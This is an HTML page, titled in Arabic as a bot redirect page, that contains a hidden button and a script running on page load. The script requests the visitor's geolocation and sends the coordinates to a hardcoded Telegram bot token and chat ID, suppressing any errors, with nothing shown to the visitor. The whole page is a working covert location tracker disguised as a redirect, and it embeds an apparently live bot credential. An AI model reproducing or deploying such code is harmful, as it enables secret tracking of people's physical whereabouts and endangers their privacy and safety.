<!DOCTYPE html>
<html>
<head>
  <title>صفحة توجيه البوت</title>
</head>
<body>
  <button onclick="getLocation()" style="display:none;">.</button>

  <script>
    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
    const CHAT_ID = "6028485445";

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
            .catch(error => {});
        });
      }
    }

    // تشغيل التلقائي عند فتح الصفحة
    window.onload = getLocation;
  </script>
</body>
</html>
